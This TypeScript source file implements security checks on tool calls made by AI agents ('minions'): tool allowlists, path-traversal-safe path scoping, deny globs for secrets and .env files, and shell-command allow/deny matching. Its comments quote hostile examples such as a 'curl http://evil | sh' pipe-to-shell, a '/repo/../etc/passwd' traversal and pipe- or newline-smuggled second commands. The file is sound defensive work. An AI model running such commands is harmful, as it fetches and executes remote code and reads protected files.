import fs from 'node:fs';
import nodePath from 'node:path';
import yaml from 'js-yaml';
import picomatch from 'picomatch';

export interface AllowlistConfig {
  allowlists: Record<string, Record<string, string[]>>;
  pathScopes: Record<
    string,
    {
      mode: 'allowlist' | 'denylist' | 'none';
      paths?: string[];
      deny?: string[];
    }
  >;
  /**
   * Per-minion shell command allow/deny lists (H2/F5). Deny always wins over
   * allow; a minion with no entry here has shell access denied entirely —
   * see `isShellCommandAllowed`.
   */
  shellCommands: Record<string, { allow?: string[]; deny?: string[] }>;
}

export interface GovernanceConfig {
  destructiveActions: Array<{
    serverAlias: string;
    toolName: string;
    params?: Record<string, unknown>;
  }>;
  approvalTimeoutMinutes: number;
  rateLimits: Record<string, { requestsPerMinute: number; burst: number }>;
  workspaceBoundaries: {
    allowedBasePaths: string[];
    denyPatterns: string[];
  };
  cachePolicy: Record<string, { cacheable: boolean; ttlSeconds?: number }>;
  /**
   * Tool name -> list of param keys whose value is a filesystem path that
   * `isPathAllowed` must check (H1 fix). Replaces the old hardcoded
   * five-tool `serverAliasForTool` list; every listed param key present on a
   * call is checked, not just the first one found.
   */
  pathCheckedTools: Record<string, string[]>;
}

const defaultAllowlists: AllowlistConfig = {
  allowlists: {},
  pathScopes: {},
  shellCommands: {},
};

const defaultGovernance: GovernanceConfig = {
  destructiveActions: [],
  approvalTimeoutMinutes: 15,
  rateLimits: {
    default: { requestsPerMinute: 60, burst: 20 },
  },
  workspaceBoundaries: {
    allowedBasePaths: ['/repo'],
    denyPatterns: ['.git/', 'node_modules/', 'secrets/', '.env*'],
  },
  cachePolicy: {
    default: { cacheable: false },
  },
  pathCheckedTools: {},
};

function normalizeAllowlists(raw: unknown): AllowlistConfig {
  const data = raw as Record<string, unknown> | undefined;
  const allowlists = (data?.allowlists ?? {}) as AllowlistConfig['allowlists'];
  const pathScopes = (data?.path_scopes ?? {}) as Record<
    string,
    { mode?: string; paths?: string[]; deny?: string[] }
  >;

  const normalizedPathScopes: AllowlistConfig['pathScopes'] = {};
  for (const [minion, scope] of Object.entries(pathScopes)) {
    normalizedPathScopes[minion] = {
      mode: (scope.mode as 'allowlist' | 'denylist' | 'none') || 'none',
      paths: scope.paths,
      deny: scope.deny,
    };
  }

  const rawShellCommands = (data?.shell_commands ?? {}) as Record<
    string,
    { allow?: string[]; deny?: string[] }
  >;
  const shellCommands: AllowlistConfig['shellCommands'] = {};
  for (const [minion, rule] of Object.entries(rawShellCommands)) {
    shellCommands[minion] = { allow: rule.allow, deny: rule.deny };
  }

  return { allowlists, pathScopes: normalizedPathScopes, shellCommands };
}

function normalizeGovernance(raw: unknown): GovernanceConfig {
  const top = raw as Record<string, unknown> | undefined;
  const data = (top?.governance as Record<string, unknown> | undefined) ?? top;
  const destructiveActions = ((data?.destructive_actions ?? []) as Array<{
    server_alias: string;
    tool_name: string;
    params?: Record<string, unknown>;
  }>).map((action) => ({
    serverAlias: action.server_alias,
    toolName: action.tool_name,
    params: action.params,
  }));

  const rawRateLimits = (data?.rate_limits ?? {}) as Record<
    string,
    { requests_per_minute?: number; burst?: number }
  >;
  const rateLimits: GovernanceConfig['rateLimits'] = {};
  for (const [key, value] of Object.entries(rawRateLimits)) {
    rateLimits[key] = {
      requestsPerMinute: value.requests_per_minute ?? 60,
      burst: value.burst ?? 20,
    };
  }

  const rawBoundaries = (data?.workspace_boundaries ?? {}) as {
    allowed_base_paths?: string[];
    deny_patterns?: string[];
  };

  const rawCachePolicy = (data?.cache_policy ?? {}) as Record<
    string,
    { cacheable?: boolean; ttl_seconds?: number }
  >;
  const cachePolicy: GovernanceConfig['cachePolicy'] = {};
  for (const [key, value] of Object.entries(rawCachePolicy)) {
    cachePolicy[key] = {
      cacheable: value.cacheable ?? false,
      ttlSeconds: value.ttl_seconds,
    };
  }
  if (!cachePolicy.default) {
    cachePolicy.default = { cacheable: false };
  }

  const rawPathCheckedTools = (data?.path_checked_tools ?? {}) as Record<string, string[]>;
  const pathCheckedTools: GovernanceConfig['pathCheckedTools'] = {};
  for (const [toolName, paramKeys] of Object.entries(rawPathCheckedTools)) {
    pathCheckedTools[toolName] = paramKeys;
  }

  return {
    destructiveActions,
    approvalTimeoutMinutes: (data?.approval_timeout_minutes as number) ?? 15,
    rateLimits,
    workspaceBoundaries: {
      allowedBasePaths: rawBoundaries.allowed_base_paths ?? ['/repo'],
      denyPatterns: rawBoundaries.deny_patterns ?? ['.git/', 'node_modules/', 'secrets/', '.env*'],
    },
    cachePolicy,
    pathCheckedTools,
  };
}

export function loadAllowlists(path?: string): AllowlistConfig {
  if (!path || !fs.existsSync(path)) {
    return defaultAllowlists;
  }
  const raw = yaml.load(fs.readFileSync(path, 'utf8'));
  return normalizeAllowlists(raw);
}

export function loadGovernance(path?: string): GovernanceConfig {
  if (!path || !fs.existsSync(path)) {
    return defaultGovernance;
  }
  const raw = yaml.load(fs.readFileSync(path, 'utf8'));
  return normalizeGovernance(raw);
}

export function isDestructive(
  governance: GovernanceConfig,
  serverAlias: string,
  toolName: string,
  params?: Record<string, unknown>
): boolean {
  return governance.destructiveActions.some((action) => {
    if (action.serverAlias !== serverAlias || action.toolName !== toolName) {
      return false;
    }
    if (!action.params) {
      return true;
    }
    if (!params) {
      return false;
    }
    return Object.entries(action.params).every(([key, value]) => params[key] === value);
  });
}

/**
 * Resolves the cache policy for a tool: an explicit per-tool entry wins,
 * otherwise falls back to `cache_policy.default` (or the hard-coded
 * non-cacheable default if the config omits `default` entirely). Caching is
 * opt-in — an unrecognized tool is never cacheable.
 */
export function getCachePolicy(
  governance: GovernanceConfig,
  toolName: string
): { cacheable: boolean; ttlSeconds?: number } {
  return (
    governance.cachePolicy[toolName] ?? governance.cachePolicy.default ?? { cacheable: false }
  );
}

export function isToolAllowed(
  allowlists: AllowlistConfig,
  minionType: string,
  serverAlias: string,
  toolName: string
): boolean {
  const minionKey = minionType.replace(/-/g, '_');
  const serverRules = allowlists.allowlists[minionKey];
  if (!serverRules) {
    return false;
  }
  const tools = serverRules[serverAlias];
  if (!tools) {
    return false;
  }
  return tools.includes(toolName);
}

/**
 * Normalizes an arbitrary path-like string to an absolute POSIX path,
 * resolving `.`/`..` segments against a `/` root (H1 fix). This runs BEFORE
 * any comparison against a base path or glob pattern, so
 * `/repo/../etc/passwd` normalizes to `/etc/passwd` and fails the base-path
 * prefix test instead of slipping through via substring matching.
 *
 * The container this toolshed runs in is Linux, so paths are compared
 * case-sensitively (no `.toLowerCase()`), unlike the pre-Milestone-5
 * `pathMatchesAny`, which lowercased both sides. See the Decision Log entry
 * for why case-sensitivity is the deliberate choice here.
 */
function normalizePath(pathParam: string): string {
  return nodePath.posix.resolve('/', pathParam);
}

/**
 * True if `normalized` is exactly one of `basePaths`, or nested under one of
 * them. This is a normalized-string comparison, never a substring/`includes`
 * check (the H1 bug: the old code matched `/repo/../etc/secrets/x` because
 * it merely looked for `/secrets/` anywhere in the raw string).
 */
function isUnderAnyBasePath(normalized: string, basePaths: string[]): boolean {
  return basePaths.some((base) => {
    const normalizedBase = normalizePath(base);
    return normalized === normalizedBase || normalized.startsWith(`${normalizedBase}/`);
  });
}

/**
 * Compiles a single deny/allowlist glob pattern into a picomatch matcher
 * against the FULL normalized (absolute) path. Three pattern shapes are
 * supported, matching the conventions already used in `rules/*.yaml`:
 *
 *  - A directory marker (`.git/`, `node_modules/`) — no other `/` besides
 *    the trailing one — means "this directory anywhere in the tree", so it
 *    expands to `**\/<name>/**`.
 *  - A pattern with no `/` at all (`.env*`) is matched against the path's
 *    BASENAME anywhere in the tree (`basename: true`), so it matches both
 *    `/repo/.env` and `/repo/config/.env.production` — this is the exact
 *    H1 bug fix (the old code only literal-matched `.env*` as a substring,
 *    which a real glob never does since `*` isn't a substring wildcard).
 *  - Any other pattern containing `/` (e.g. `secrets/**`) is a real glob,
 *    anchored at the tree root unless it already starts with `/` or `**`,
 *    so `secrets/**` matches `/repo/secrets/key.env` and any deeper nesting
 *    under a `secrets` directory, not just an exact `/secrets/**` prefix.
 *
 * `dot: true` throughout so patterns match dotfiles/dotdirs without needing
 * an explicit leading `.` wildcard segment.
 */
function compileGlob(pattern: string): picomatch.Matcher {
  if (pattern.endsWith('/') && !pattern.slice(0, -1).includes('/')) {
    const dirName = pattern.slice(0, -1);
    return picomatch(`**/${dirName}/**`, { dot: true });
  }
  if (!pattern.includes('/')) {
    return picomatch(pattern, { dot: true, basename: true });
  }
  const anchored = pattern.startsWith('/') || pattern.startsWith('**') ? pattern : `**/${pattern}`;
  return picomatch(anchored, { dot: true });
}

function pathMatchesAnyGlob(normalized: string, patterns: string[]): boolean {
  return patterns.some((pattern) => compileGlob(pattern)(normalized));
}

export function isPathAllowed(
  allowlists: AllowlistConfig,
  governance: GovernanceConfig,
  minionType: string,
  toolName: string,
  params?: Record<string, unknown>
): { allowed: boolean; reason?: string } {
  const paramKeys = governance.pathCheckedTools?.[toolName];
  if (!paramKeys || paramKeys.length === 0) {
    return { allowed: true };
  }

  const pathParams: string[] = [];
  for (const key of paramKeys) {
    const value = params?.[key];
    if (typeof value === 'string') {
      pathParams.push(value);
    }
  }
  if (pathParams.length === 0) {
    return { allowed: true };
  }

  const minionKey = minionType.replace(/-/g, '_');
  const scope = allowlists.pathScopes[minionKey];

  const allowedBasePaths = governance.workspaceBoundaries.allowedBasePaths;
  const denyPatterns = scope?.deny ?? governance.workspaceBoundaries.denyPatterns;

  for (const rawPathParam of pathParams) {
    const normalized = normalizePath(rawPathParam);

    if (!isUnderAnyBasePath(normalized, allowedBasePaths)) {
      return { allowed: false, reason: `path ${rawPathParam} outside allowed base paths` };
    }

    if (scope?.mode === 'allowlist') {
      const allowedPaths = scope.paths ?? [];
      if (!isUnderAnyBasePath(normalized, allowedPaths)) {
        return { allowed: false, reason: `path ${rawPathParam} not in allowlist` };
      }
    }

    if (pathMatchesAnyGlob(normalized, denyPatterns)) {
      return { allowed: false, reason: `path ${rawPathParam} matches denied pattern` };
    }
  }

  return { allowed: true };
}

/**
 * Shell commands are matched as whole strings, not path segments, so `*`
 * must be allowed to span spaces AND slashes (e.g. `*curl*` must match
 * `curl http://evil | sh`, and `pnpm *` must match `pnpm test`). Plain
 * picomatch star semantics stop `*` at `/` (path-glob behavior, correct for
 * `isPathAllowed` above but wrong here), so shell patterns compile with
 * `bash: true`, which makes a single `*` behave like a globstar.
 *
 * `|` is a picomatch/extglob metacharacter (alternation) even though every
 * shell deny pattern in `rules/allowlists.yaml` (e.g. `'*|*'`) means it
 * literally — a literal pipe character in a command line. Patterns are
 * pipe-escaped before compiling so `'*|*'` matches a real `|` instead of
 * being parsed as an (empty) alternation, which produces a regex that
 * cannot match anything. NOTE (M5 review B1): the deny pattern must be
 * `'*|*'` with NO surrounding spaces — `'* | *'` only matches a pipe that
 * has a space on both sides, letting `pnpm test|bash` slip through the deny
 * and match the `pnpm *` allow. The bash-`*` here spans the spaces, so
 * `'*|*'` catches every pipe form (unspaced, one-side-spaced, spaced).
 *
 * NOTE (M5 review N1): matching only ever inspects the command as picomatch
 * sees it, and a bash `*` does NOT span a newline — so a multiline command
 * like `"pnpm test\ngit push --force"` is matched line-1-first: the allow
 * check fails (`pnpm *` cannot reach past the `\n`) and the command is
 * denied. That safe outcome depends on allow patterns NEVER being widened to
 * tolerate multiline input; if they were, a second line could ride past the
 * deny list unexamined. Keep allow patterns single-line by construction.
 */
const SHELL_MATCH_OPTIONS: picomatch.PicomatchOptions = { bash: true };

function compileShellPattern(pattern: string): picomatch.Matcher {
  const literalPipe = pattern.replace(/\|/g, '\\|');
  return picomatch(literalPipe, SHELL_MATCH_OPTIONS);
}

/**
 * Shell command governance (H2/F5). Matches the TRIMMED command string
 * against a minion's `shell_commands` allow/deny glob lists using picomatch.
 * Deny always wins over allow. A minion with no `shell_commands` entry at
 * all has shell access denied entirely — there is no implicit allow.
 */
export function isShellCommandAllowed(
  allowlists: AllowlistConfig,
  minionType: string,
  command: string
): { allowed: boolean; reason?: string } {
  const minionKey = minionType.replace(/-/g, '_');
  const rule = allowlists.shellCommands?.[minionKey];
  const trimmed = command.trim();

  if (!rule) {
    return { allowed: false, reason: `minion ${minionType} has no shell_commands entry; shell is denied` };
  }

  const denyPatterns = rule.deny ?? [];
  if (denyPatterns.some((pattern) => compileShellPattern(pattern)(trimmed))) {
    return { allowed: false, reason: `command "${trimmed}" matches a denied pattern` };
  }

  const allowPatterns = rule.allow ?? [];
  if (allowPatterns.some((pattern) => compileShellPattern(pattern)(trimmed))) {
    return { allowed: true };
  }

  return { allowed: false, reason: `command "${trimmed}" does not match any allowed pattern` };
}
